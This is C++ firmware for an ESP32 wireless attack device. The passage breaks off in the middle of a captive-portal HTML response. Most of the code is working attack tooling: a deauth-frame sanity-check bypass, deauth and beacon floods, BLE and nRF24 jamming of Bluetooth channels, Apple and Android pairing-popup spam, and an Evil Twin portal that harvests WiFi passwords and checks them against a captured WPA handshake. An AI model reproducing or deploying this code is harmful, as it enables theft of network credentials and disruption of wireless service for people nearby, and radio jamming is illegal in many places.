#include <DNSServer.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_task_wdt.h"
#include "tcpip_adapter.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <RF24.h>
#include <FS.h>
#include <SPIFFS.h>
#include "mbedtls/md5.h"
#include "mbedtls/sha1.h"
#include "mbedtls/pkcs5.h"
#include "esp_wpa2.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gattc_api.h"
#include "esp_gatts_api.h"
#include "esp_bt_main.h"

portMUX_TYPE counterMux = portMUX_INITIALIZER_UNLOCKED;

// Performance optimization flags
bool nrfTurboMode = false;  // When true, UI freezes for max speed
unsigned long nrfLastStats = 0;

// SPI speed constant (ADD THIS)
#define NRF_SPI_SPEED 16000000

// Thread-safe increment macros
#define SAFE_INCREMENT(counter) do { \
  portENTER_CRITICAL(&counterMux); \
  counter++; \
  portEXIT_CRITICAL(&counterMux); \
} while(0)

#define SAFE_ADD(counter, value) do { \
  portENTER_CRITICAL(&counterMux); \
  counter += value; \
  portEXIT_CRITICAL(&counterMux); \
} while(0)

#define SAFE_READ(counter, dest) do { \
  portENTER_CRITICAL(&counterMux); \
  dest = counter; \
  portEXIT_CRITICAL(&counterMux); \
} while(0)

// ==================== MARAUDER DEAUTH BYPASS ====================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

// ==================== HANDSHAKE CAPTURE ====================
struct HandshakeData {
  uint8_t anonce[32];
  uint8_t snonce[32];
  uint8_t clientMAC[6];
  uint8_t apMAC[6];
  uint8_t mic[16];
  bool captured;
};

HandshakeData capturedHandshake;

// ==================== TFT DISPLAY ====================
TFT_eSPI tft = TFT_eSPI();

// ==================== DNS SERVER & WEB SERVER ====================
DNSServer dnsServer;
WebServer webServer(80);

// ==================== nRF24L01 DUAL MODULE SETUP ====================
#define NRF1_CE_PIN  26   // Changed from 4
#define NRF1_CSN_PIN 25   // Changed from 15
#define NRF2_CE_PIN  33   // Changed from 2
#define NRF2_CSN_PIN 27   // Kept same (OK)
#define HSPI_MISO 12      // Kept same
#define HSPI_MOSI 13      // Kept same
#define HSPI_SCLK 14      // Kept same

const uint8_t ble_channels[] = {37, 38, 39};
uint8_t current_ble_channel = 0;

// Enhanced jammer stats
uint32_t bleDisconnectsSent = 0;
uint32_t bleConnectFloodSent = 0;

// Pre-built packets for speed
uint8_t adv_spam_packet[31];
uint8_t disconnect_packet[31];
uint8_t connect_flood_packet[31];

SPIClass hspi(HSPI);
RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN, NRF_SPI_SPEED); 
RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN, NRF_SPI_SPEED);

bool nrf1Available = false;
bool nrf2Available = false;

// ==================== NETWORK VARIABLES ====================
String selectedSSID = "";
String capturedPassword = "";
bool portalActive = false;
int scanResults = 0;

// ==================== BLE SCANNER ====================
BLEScan* pBLEScan = nullptr;
BLEAdvertising* pAdvertising = nullptr;
int bleScanTime = 5;

// ==================== BLE JAMMER MODES & STATS ====================
enum BLEJamMode {
  JAM_SPAM,           // Spam fake devices (discovery disruption)
  JAM_DEAUTH,         // Actively disconnect devices
  JAM_FLOOD,          // Flood with connection requests
  JAM_AGGRESSIVE      // ALL ATTACKS (most effective)
};

BLEJamMode currentBLEJamMode = JAM_AGGRESSIVE;

// BLE Attack statistics
uint32_t bleSpamPackets = 0;
uint32_t bleDeauthPackets = 0;
uint32_t bleFloodPackets = 0;
uint32_t bleTargetsFound = 0;

// BLE Target list (for deauth attacks)
struct BLETarget {
  uint8_t addr[6];
  uint8_t addrType;
  int8_t rssi;
  bool active;
  unsigned long lastSeen;
};

BLETarget bleTargets[20];
int bleTargetCount = 0;

// ==================== CONSOLE BUFFER ====================
String consoleBuffer[15];
int consoleIndex = 0;

// ==================== PACKET SNIFFER VARIABLES ====================
bool snifferActive = false;
uint32_t packetCount = 0;
uint32_t beaconCount = 0;
uint32_t dataCount = 0;
uint32_t deauthCount = 0;
uint8_t snifferChannel = 1;

#define MAX_SNIFFER_PACKETS 100U

struct PacketInfo {
  uint8_t type;
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
};

PacketInfo packetHistory[MAX_SNIFFER_PACKETS];
int packetHistoryIndex = 0;
int snifferScrollOffset = 0;

// ==================== BLE JAMMER VARIABLES ====================
bool bleJammerActive = false;
unsigned long lastBLEJamTime = 0;
uint32_t bleJamPackets = 0;  // KEEP THIS - it's the total counter
String jammerModeText = "Aggressive";

// ==================== nRF24 JAMMER VARIABLES ====================
bool nrfJammerActive = false;
bool dualNRFMode = true;
uint32_t nrfJamPackets = 0;
uint32_t nrf1Packets = 0;
uint32_t nrf2Packets = 0;
unsigned long lastNRFJamTime = 0;

// Smoochiee's hopping pattern variables
unsigned int flag_radio1 = 0;   // Direction flag for radio 1
unsigned int flag_radio2 = 0;   // Direction flag for radio 2
int nrf_ch1 = 2;    // Radio 1 current channel (start low)
int nrf_ch2 = 45;   // Radio 2 current channel (start mid, offset pattern)

// Jamming mode
enum NRFJamMode {
  NRF_SWEEP,      // Smoochiee's sweep pattern (most effective)
  NRF_RANDOM,     // Random hopping (chaotic)
  NRF_FOCUSED     // Focused on critical BT/BLE channels
};

NRFJamMode nrfJamMode = NRF_SWEEP;  // Default to Smoochiee's method

// Critical BT/BLE channels - focus here for max effect
byte hopping_channel[] = { 
  2, 26, 80,              // BLE advertising (most critical!)
  0, 1, 4, 6, 8,          // BLE data low
  22, 24, 28, 30,         // BT Classic hotspots
  32, 34, 46, 48, 50, 52, // BT Classic more
  74, 76, 78, 82, 84, 86  // BLE data high
};

byte ptr_hop1 = 0;  // Radio 1 pointer
byte ptr_hop2 = 12; // Radio 2 pointer (offset by half array)

// ==================== BEACON FLOOD VARIABLES ====================
String customBeacons[20] = {};
int customBeaconCount = 0;
int beaconDisplayOffset = 0;
const int MAX_DISPLAY_BEACONS = 5;

// ==================== ANIMATION VARIABLES ====================
float skullX = 120;
float skullY = 160;
float skullVelX = 2;
float skullVelY = 1.5;
unsigned long lastAnimTime = 0;
bool showSkull = false;

// ==================== UI VARIABLES ====================
int hoveredIndex = -1;
int selectedMenuIndex = -1;
unsigned long lastTouchTime = 0;
#define HOVER_DELAY 100

// ==================== WIFI SCAN VARIABLES ====================
bool continuousWiFiScan = false;
unsigned long lastWiFiScanTime = 0;
int scanDisplayOffset = 0;
const int MAX_DISPLAY_APS = 7;
int wifiScrollOffset = 0;
#define MAX_WIFI_DISPLAY 9

// ==================== BLE SCAN VARIABLES ====================
bool continuousBLEScan = false;
unsigned long lastBLEScanUpdate = 0;

// ==================== AIRTAG DETECTION ====================
struct AirTagDevice {
  String address;
  int rssi;
  unsigned long lastSeen;
  int detectionCount;
};

AirTagDevice airTags[20];
int airTagCount = 0;

// ==================== CARD SKIMMER DETECTION ====================
struct SkimmerSignature {
  String name;
  int rssi;
  unsigned long detected;
};

SkimmerSignature skimmers[10];
int skimmerCount = 0;

// ==================== DEAUTH SNIFFER ====================
bool deauthSnifferActive = false;
uint32_t detectedDeauths = 0;

struct DeauthEvent {
  uint8_t sourceMAC[6];
  uint8_t targetMAC[6];
  int8_t rssi;
  unsigned long timestamp;
  uint8_t channel;
};

DeauthEvent deauthEvents[50];
int deauthEventCount = 0;
int deauthScrollOffset = 0;
#define MAX_DEAUTH_DISPLAY 8

// ==================== MENU STATES ====================
enum MenuState {
  BOOT_ANIMATION,
  MAIN_MENU,
  WIFI_MENU,
  WIFI_SCAN,
  SELECT_TARGET,
  WIFI_ATTACK_MENU,
  BEACON_MANAGER,
  BEACON_ADD,
  CAPTURED_PASSWORDS,
  HANDSHAKE_CAPTURE,
  BLE_MENU,
  BLE_SCAN_RESULTS,
  BLE_JAM_MENU,
  BLE_JAM_ACTIVE,
  NRF_JAM_MENU,
  NRF_JAM_ACTIVE,
  WIFI_BLE_NRF_JAM,
  AIRTAG_SCANNER,
  AIRTAG_RESULTS,
  SKIMMER_DETECTOR,
  SKIMMER_RESULTS,
  CAPTIVE_PORTAL_MENU,
  SNIFFER_MENU,
  SNIFFER_ACTIVE,
  DEAUTH_SNIFFER,
  DEAUTH_SNIFFER_ACTIVE,
  WARDRIVING_MODE,
  SPAM_MENU,
  MORE_TOOLS_MENU,
  CONSOLE_VIEW,
  SETTINGS_MENU,
  DEVICE_INFO,
  ASCII_ART_VIEWER
};

MenuState currentState = BOOT_ANIMATION;
MenuState previousState = MAIN_MENU;
int selectedIndex = 0;
int scrollOffset = 0;

// ==================== BLE SCAN RESULTS ====================
struct BLEResult {
  String address;
  String name;
  int rssi;
  String type;
};

BLEResult bleDevices[50];
int bleDeviceCount = 0;

// Apple Company ID: 0x4C00 (Little Endian: 0x00, 0x4C)

// Proximity Pairing - AirPods popup
const uint8_t apple_proximity_pair[] = {
  0x07,  // Type: Proximity Pairing
  0x19,  // Length: 25 bytes
  0x01,  // Status flags
  0x02, 0x20,  // Device model (0x0220 = AirPods)
  0x00,  // Status
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Device address (random)
  0x00,  // Hint
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Reserved
  0x00, 0x00, 0x00  // Battery levels
};

// Nearby Action - AppleTV/AirDrop popup
const uint8_t apple_nearby_action[] = {
  0x0F,  // Type: Nearby Action
  0x05,  // Length: 5 bytes
  0x00,  // Action flags
  0xC0,  // Action type (AppleTV)
  0x00, 0x00, 0x00  // Authentication tag
};

// AirTag found
const uint8_t apple_airtag_popup[] = {
  0x07,  // Type: Proximity Pairing
  0x19,  // Length
  0x01,
  0x01, 0x42,  // Model: AirTag
  0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00
};

// Apple device models for Proximity Pairing (0x07)
const uint16_t apple_models[] = {
  0x0220,  // AirPods
  0x0F20,  // AirPods Pro
  0x1320,  // AirPods Max
  0x1420,  // AirPods Gen 3
  0x0142,  // AirTag
  0x0055,  // Airtag
  0x0030,  // Hermes AirTag
  0x0620,  // Beats Solo 3
  0x0320,  // Powerbeats 3
  0x0520   // BeatsX
};

// Nearby Action types (0x0F)
const uint8_t apple_actions[] = {
  0xC0,  // AppleTV Setup
  0xC1,  // Mobile Backup
  0xC3,  // AppleTV Pair
  0xC5,  // AppleTV New User
  0xC6,  // AppleTV AppleID Setup
  0xC8,  // AppleTV Wireless Audio Sync
  0xC9,  // AppleTV HomeKit Setup
  0xCB,  // AppleTV Keyboard
  0xD0   // Join this AppleTV?
};

// ==================== ANDROID FAST PAIR PACKET STRUCTURES ====================

// Google Fast Pair - Model IDs that trigger "Connect your device" popup
const uint32_t android_models[] = {
  0x2D7A23,  // Pixel Buds
  0x0001F0,  // Pixel Buds A-Series
  0x718FA4,  // Galaxy Buds
  0x92BBBD,  // Galaxy Buds+ 
  0x9C64F4,  // Galaxy Buds Live
  0xB49271,  // Galaxy Buds Pro
  0x2D5F14,  // JBL Live Pro+
  0x0E30C3,  // Sony WF-1000XM3
  0xCD8256,  // Bose QC Earbuds
  0x454E53,  // Nothing Ear (1)
  0x0003F0,  // Pixel Buds Pro
  0x003001,  // OnePlus Buds Pro
  0xD320D9   // Xiaomi Buds 4
};

// ==================== ATTACK VARIABLES ====================
bool deauthActive = false;
bool useAlternativeDeauth = false;
uint8_t currentDeauthMethod = 0;  // 0=Standard, 1=Storm
bool beaconFloodActive = false;
bool appleSpamActive = false;
bool androidSpamActive = false;
unsigned long lastAppleSpam = 0;
unsigned long lastAndroidSpam = 0;
uint32_t appleSpamCount = 0;
uint32_t androidSpamCount = 0;
unsigned long lastAttackTime = 0;
uint32_t deauthPacketsSent = 0;

// ==================== WARDRIVING ====================
struct WardrivingData {
  int totalAPs;
  int openAPs;
  int securedAPs;
  String strongestSSID;
  int strongestRSSI;
};

WardrivingData wardrivingStats;

// ==================== CAPTURED CREDENTIALS ====================
struct CapturedCredential {
  String ssid;
  String bssid;
  String password;
  unsigned long timestamp;
  bool validated;
  bool likelyCorrect;
};

CapturedCredential capturedCreds[20];
int capturedCredCount = 0;
int credDisplayOffset = 0;
#define MAX_DISPLAY_CREDS 6

// ==================== NETWORK INFO ====================
struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  uint8_t encryptionType;
  String encryption;
  bool isEncrypted;
  unsigned long lastSeen;
  bool isNew;
};

NetworkInfo networks[50];
int networkCount = 0;

// ==================== Deauth Flood Variables ====================
bool deauthFloodActive = false;
uint32_t deauthFloodPackets = 0;
unsigned long lastDeauthFloodUpdate = 0;

struct DeauthTarget {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
  uint32_t packetsSent;
  bool active;
};

DeauthTarget deauthTargets[50];
int deauthTargetCount = 0;

int bleScrollOffset = 0;
int airtagScrollOffset = 0;
int skimmerScrollOffset = 0;

// ==================== SCREEN SIZE ====================
#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

// ==================== LAYOUT SPACING ====================
#define HEADER_HEIGHT 24
#define SIDE_MARGIN 6
#define MENU_ITEM_HEIGHT 22
#define MENU_SPACING 6
#define BUTTON_WIDTH 180
#define BUTTON_HEIGHT 32
#define BUTTON_SPACING 8

// ==================== COLORS (KALI TERMINAL THEME) ====================
#define COLOR_BG           0x0000  // Pure black
#define COLOR_TERMINAL_BG  0x0000
#define COLOR_TEXT         0xCE79  // Light grey
#define COLOR_GREEN        0x07E0  // Kali green
#define COLOR_DARK_GREEN   0x0320  // Dark green
#define COLOR_CYAN         0x07FF
#define COLOR_YELLOW       0xFFE0
#define COLOR_RED          0xF800
#define COLOR_BLUE         0x001F
#define COLOR_PURPLE       0x780F
#define COLOR_ORANGE       0xFD20
#define COLOR_WHITE        0xFFFF
#define COLOR_GREY         0x7BEF
#define COLOR_HOVER_BG     0x18E3
#define COLOR_SELECTED_BG  0x2104

// Legacy aliases
#define COLOR_HEADER       COLOR_TERMINAL_BG
#define COLOR_ITEM_BG      COLOR_TERMINAL_BG
#define COLOR_BORDER       COLOR_DARK_GREEN
#define COLOR_WARNING      COLOR_ORANGE
#define COLOR_SUCCESS      COLOR_GREEN
#define COLOR_CRITICAL     COLOR_RED
#define COLOR_ACCENT       COLOR_GREEN
#define COLOR_MATRIX_GREEN COLOR_GREEN
#define COLOR_LIME         0x87F0

// ==================== FORWARD DECLARATIONS ====================
void drawMainMenu();
void drawWiFiMenu();
void drawBLEMenu();
void drawAttackMenu();
void drawBLEJammerMenu();
void showMessage(const char* msg, uint16_t color);
void updateBLEJammerDisplay();
void addToConsole(String message);
void handleBeaconAddTouch(int x, int y);

#define HOVER_DELAY 100

// ==================== TERMINAL-STYLE HEADER ====================
void drawTerminalHeader(const char* title) {
  tft.fillScreen(COLOR_BG);
  
  // Top border line (Kali green)
  tft.drawFastHLine(0, 0, 240, COLOR_GREEN);
  
  // Header text - terminal style with prompt
  tft.setTextSize(1);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(5, 5);
  tft.print("root@p4wnc4k3");
  tft.setTextColor(COLOR_WHITE);
  tft.print(":");
  tft.setTextColor(COLOR_CYAN);
  tft.print("~");
  tft.setTextColor(COLOR_WHITE);
  tft.print("# ");
  tft.setTextColor(COLOR_TEXT);
  tft.print(title);
  
  // Bottom border
  tft.drawFastHLine(0, HEADER_HEIGHT - 1, 240, COLOR_GREEN);
}

// ==================== CAPTURE HANDSHAKE FROM SNIFFER ====================
void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  packetCount++;
  uint8_t frameType = pkt->payload[0];
  
  // CRITICAL: Only essential processing in interrupt context
  // No Serial.println() - causes crashes!
  
  // === DEAUTH DETECTION (NEW) ===
  if (deauthSnifferActive && (frameType == 0xC0 || frameType == 0xA0)) {
    // Deauth or Disassociation frame detected
    if (deauthEventCount < 50) {
      DeauthEvent* event = &deauthEvents[deauthEventCount];
      
      // Extract source MAC (sender of deauth)
      memcpy(event->sourceMAC, &pkt->payload[10], 6);
      
      // Extract target MAC (receiver)
      memcpy(event->targetMAC, &pkt->payload[4], 6);
      
      event->rssi = pkt->rx_ctrl.rssi;
      event->channel = pkt->rx_ctrl.channel;
      event->timestamp = millis();
      
      deauthEventCount++;
      detectedDeauths++;
    }
  }
  
  // Detect EAPOL frames (WPA handshake) - FAST check only
  if (type == WIFI_PKT_MISC && pkt->rx_ctrl.sig_len > 100) {
    if (pkt->payload[30] == 0x88 && pkt->payload[31] == 0x8E) {
      uint8_t keyInfo = pkt->payload[37];
      
      if ((keyInfo & 0x08) && (keyInfo & 0x01)) {
        // Extract only critical data
        memcpy(capturedHandshake.clientMAC, &pkt->payload[4], 6);
        memcpy(capturedHandshake.apMAC, &pkt->payload[10], 6);
        
        if (!(keyInfo & 0x40)) {
          memcpy(capturedHandshake.anonce, &pkt->payload[51], 32);
        }
        
        if (keyInfo & 0x40) {
          memcpy(capturedHandshake.snonce, &pkt->payload[51], 32);
          memcpy(capturedHandshake.mic, &pkt->payload[85], 16);
          capturedHandshake.captured = true;
        }
      }
    }
  }
  
  // Fast packet type counting
  if (frameType == 0x80) {
    beaconCount++;
  }
  else if ((frameType & 0x0C) == 0x08) {
    dataCount++;
  }
  else if (frameType == 0xC0 || frameType == 0xA0) {
    deauthCount++;
  }
  
  // Store minimal packet info
  packetHistory[packetHistoryIndex].type = frameType;
  packetHistory[packetHistoryIndex].rssi = pkt->rx_ctrl.rssi;
  packetHistory[packetHistoryIndex].channel = pkt->rx_ctrl.channel;
  packetHistory[packetHistoryIndex].timestamp = millis();
  packetHistoryIndex = (packetHistoryIndex + 1) % MAX_SNIFFER_PACKETS;
}

struct PasswordValidationTask {
  String password;
  String ssid;
  bool* result;
  bool* completed;
};
// ==================== VALIDATE PASSWORD AGAINST HANDSHAKE ====================
void validatePasswordTask(void* parameter) {
  PasswordValidationTask* params = (PasswordValidationTask*)parameter;
  
  Serial.println("[*] Validating password in background task...");
  
  if (!capturedHandshake.captured) {
    Serial.println("[-] No handshake captured yet");
    *(params->result) = false;
    *(params->completed) = true;
    vTaskDelete(NULL);
    return;
  }
  
  // Step 1: Calculate PMK
  uint8_t pmk[32];
  
  mbedtls_md_context_t ctx;
  mbedtls_md_init(&ctx);
  mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
  
  // This is the slow part (2-3 seconds)
  mbedtls_pkcs5_pbkdf2_hmac(
    &ctx,
    (const unsigned char*)params->password.c_str(), params->password.length(),
    (const unsigned char*)params->ssid.c_str(), params->ssid.length(),
    4096,
    32,
    pmk
  );
  
  mbedtls_md_free(&ctx);
  
  // Step 2: Calculate PTK
  uint8_t ptk[64];
  uint8_t ptkData[100];
  int pos = 0;
  
  memcpy(&ptkData[pos], "Pairwise key expansion", 23);
  pos += 23;
  
  if (memcmp(capturedHandshake.apMAC, capturedHandshake.clientMAC, 6) < 0) {
    memcpy(&ptkData[pos], capturedHandshake.apMAC, 6); pos += 6;
    memcpy(&ptkData[pos], capturedHandshake.clientMAC, 6); pos += 6;
  } else {
    memcpy(&ptkData[pos], capturedHandshake.clientMAC, 6); pos += 6;
    memcpy(&ptkData[pos], capturedHandshake.apMAC, 6); pos += 6;
  }
  
  if (memcmp(capturedHandshake.anonce, capturedHandshake.snonce, 32) < 0) {
    memcpy(&ptkData[pos], capturedHandshake.anonce, 32); pos += 32;
    memcpy(&ptkData[pos], capturedHandshake.snonce, 32); pos += 32;
  } else {
    memcpy(&ptkData[pos], capturedHandshake.snonce, 32); pos += 32;
    memcpy(&ptkData[pos], capturedHandshake.anonce, 32); pos += 32;
  }
  
  mbedtls_md_hmac(
    mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
    pmk, 32,
    ptkData, pos,
    ptk
  );
  
  // Step 3: Compare MIC
  uint8_t calculatedMIC[16];
  memcpy(calculatedMIC, ptk, 16);
  
  bool matches = (memcmp(calculatedMIC, capturedHandshake.mic, 16) == 0);
  
  Serial.printf("[%s] Password validation: %s\n", 
                matches ? "+" : "-", 
                matches ? "CORRECT!" : "INCORRECT");
  
  *(params->result) = matches;
  *(params->completed) = true;
  
  vTaskDelete(NULL);
}

bool validatePasswordWithHandshake(String password, String ssid) {
  if (!capturedHandshake.captured) {
    Serial.println("[-] No handshake captured yet");
    return false;
  }
  
  // ✅ Quick validation first
  if (password.length() < 8 || password.length() > 63) {
    return false;
  }
  
  static bool validationResult = false;
  static bool validationCompleted = false;
  
  PasswordValidationTask params;
  params.password = password;
  params.ssid = ssid;
  params.result = &validationResult;
  params.completed = &validationCompleted;
  
  validationCompleted = false;
  
  // Start validation task
  xTaskCreate(
    validatePasswordTask,
    "pwd_validate",
    8192,
    &params,
    1,
    NULL
  );
  
  // Wait for completion (with timeout)
  unsigned long startTime = millis();
  while (!validationCompleted && (millis() - startTime < 10000)) {
    esp_task_wdt_reset();
    delay(100);
  }
  
  if (!validationCompleted) {
    Serial.println("[!] Validation timeout");
    return false;
  }
  
  return validationResult;
}

bool validateWiFiPassword(String password) {
  int len = password.length();
  
  // WPA/WPA2 passwords must be 8-63 characters
  if (len < 8 || len > 63) {
    return false;
  }
  
  // Check for common patterns that suggest fake/weak passwords
  String lower = password;
  lower.toLowerCase();
  
  // Too simple patterns (likely fake)
  if (lower == "12345678" || lower == "password" || 
      lower == "qwertyui" || lower == "11111111") {
    return false;
  }
  
  // All same character (likely fake)
  bool allSame = true;
  char first = password.charAt(0);
  for (int i = 1; i < len; i++) {
    if (password.charAt(i) != first) {
      allSame = false;
      break;
    }
  }
  if (allSame) return false;
  
  // Check for mix of character types (more likely to be real)
  bool hasUpper = false, hasLower = false, hasDigit = false, hasSpecial = false;
  for (int i = 0; i < len; i++) {
    char c = password.charAt(i);
    if (isupper(c)) hasUpper = true;
    else if (islower(c)) hasLower = true;
    else if (isdigit(c)) hasDigit = true;
    else hasSpecial = true;
  }
  
  // Strong passwords have multiple character types
  int typeCount = hasUpper + hasLower + hasDigit + hasSpecial;
  return typeCount >= 2; // At least 2 different types
}

void displayCapturedPasswords() {
  currentState = CAPTURED_PASSWORDS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("captured passwords");
  
  if (capturedCredCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 60);
    tft.println("No passwords captured yet.");
    
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 80);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.println("Start Evil Twin to capture");
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 92);
    tft.println("credentials from targets.");
  } else {
    // Status bar
    tft.setTextSize(1);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
    tft.printf("Total: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", capturedCredCount);
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(100, HEADER_HEIGHT + 5);
    tft.printf("Valid: ");
    int validCount = 0;
    for (int i = 0; i < capturedCredCount; i++) {
      if (capturedCreds[i].likelyCorrect) validCount++;
    }
    tft.setTextColor(COLOR_GREEN);
    tft.printf("%d", validCount);
    
    // Column headers
    int listY = HEADER_HEIGHT + 25;
    tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, listY);
    tft.print("NETWORK");
    tft.setCursor(200, listY);
    tft.print("STAT");
    
    tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
    listY += 15;
    
    // Display credentials (scrollable)
    int displayCount = min(capturedCredCount - credDisplayOffset, MAX_DISPLAY_CREDS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = credDisplayOffset + i;
      int y = listY + (i * 42);
      
      // Background for entry
      if (hoveredIndex == i) {
        tft.fillRect(0, y - 2, 240, 42, COLOR_HOVER_BG);
      }
      
      // Status indicator
      uint16_t statusColor = capturedCreds[idx].likelyCorrect ? COLOR_GREEN : COLOR_ORANGE;
      tft.fillCircle(SIDE_MARGIN + 2, y + 5, 3, statusColor);
      
      // SSID (truncated)
      tft.setTextSize(1);
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 10, y + 2);
      String displaySSID = capturedCreds[idx].ssid;
      if (displaySSID.length() > 22) displaySSID = displaySSID.substring(0, 21) + "~";
      tft.println(displaySSID);
      
      // BSSID
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(SIDE_MARGIN + 10, y + 12);
      tft.print(capturedCreds[idx].bssid);
      
      // Password (truncated with indicator)
      tft.setTextColor(statusColor);
      tft.setCursor(SIDE_MARGIN + 10, y + 24);
      String displayPwd = capturedCreds[idx].password;
      if (displayPwd.length() > 28) {
        displayPwd = displayPwd.substring(0, 27) + "~";
      }
      tft.print(displayPwd);
      
      // Validation status
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(200, y + 12);
      tft.print(capturedCreds[idx].likelyCorrect ? "OK" : "??");
    }
    
    // Scroll indicator
    if (capturedCredCount > MAX_DISPLAY_CREDS) {
      int scrollY = listY + (MAX_DISPLAY_CREDS * 42) + 5;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      tft.setCursor(80, scrollY);
      tft.printf("[%d-%d/%d]", 
                 credDisplayOffset + 1, 
                 credDisplayOffset + displayCount, 
                 capturedCredCount);
    }
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

String password = webServer.arg("password");

// ==================== UPDATED handlePortalPost() WITH REAL VALIDATION ====================
void handlePortalPost() {
  if (webServer.hasArg("password")) {
    String password = webServer.arg("password");
    if (password.length() > 63) {
      password = password.substring(0, 63);
    }
    password.replace("\0", "");
    
    bool basicValid = validateWiFiPassword(password);
    
    // Real validation (slow, only if handshake captured)
    bool reallyCorrect = false;
    if (capturedHandshake.captured && basicValid) {
      reallyCorrect = validatePasswordWithHandshake(password, selectedSSID);
    } else {
      reallyCorrect = basicValid;
    }
    
    // Find BSSID
    String bssidStr = "Unknown";
    for (int i = 0; i < networkCount; i++) {
      if (networks[i].ssid == selectedSSID) {
        bssidStr = "";
        for (int j = 0; j < 6; j++) {
          if (j > 0) bssidStr += ":";
          if (networks[i].bssid[j] < 16) bssidStr += "0";
          bssidStr += String(networks[i].bssid[j], HEX);
        }
        bssidStr.toUpperCase();
        break;
      }
    }
    
    // Store credential
    if (capturedCredCount < 20) {
      capturedCreds[capturedCredCount].ssid = selectedSSID;
      capturedCreds[capturedCredCount].bssid = bssidStr;
      capturedCreds[capturedCredCount].password = password;
      capturedCreds[capturedCredCount].timestamp = millis();
      capturedCreds[capturedCredCount].validated = capturedHandshake.captured;
      capturedCreds[capturedCredCount].likelyCorrect = reallyCorrect;
      capturedCredCount++;
      
      String validStr;
      if (capturedHandshake.captured) {
        validStr = reallyCorrect ? "VERIFIED CORRECT" : "VERIFIED WRONG";
      } else {
        validStr = basicValid ? "LIKELY VALID" : "WEAK/FAKE";
      }
      
      addToConsole("PWD [" + validStr + "]: " + password);
      
      Serial.printf("\n[PASSWORD CAPTURED]\n");
      Serial.printf("SSID: %s\n", selectedSSID.c_str());
      Serial.printf("BSSID: %s\n", bssidStr.c_str());
      Serial.printf("Password: %s\n", password.c_str());
      Serial.printf("Handshake: %s\n", capturedHandshake.captured ? "YES" : "NO");
      Serial.printf("Validation: %s\n", validStr.c_str());
      Serial.printf("Total captured: %d\n\n", capturedCredCount);
    }
    
    // SUCCESS RESPONSE (FIXED - No Chinese text)
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>";
    html += "<meta http-equiv='refresh' content='3;url=/'>";
    html += "<style>";
    html += "*{margin:0;padding:0;box-sizing:border-box;}";
    html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
    html += "background:#e5e5e5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;}";
    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
    html += "max-width:450px;width:100%;}";
    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:25px;border-radius:12px 12px 0 0;";
    html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
    html += ".success-icon{width:80px;height:80px;margin:0 auto 15px;background:#34C759;border-radius:50%;";
    html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(52,199,89,0.3);}";
    html += ".success-icon::after{content:'✓';color:#fff;font-size:50px;font-weight:bold;}";
    html += ".content{padding:25px;text-align:center;}";
    html += "h2{margin:0 0 15px;color:#000;font-size:19px;font-weight:600;line-height:1.3;}";
    html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
    html += ".network-name{font-weight:600;color:#000;word-wrap:break-word;}";
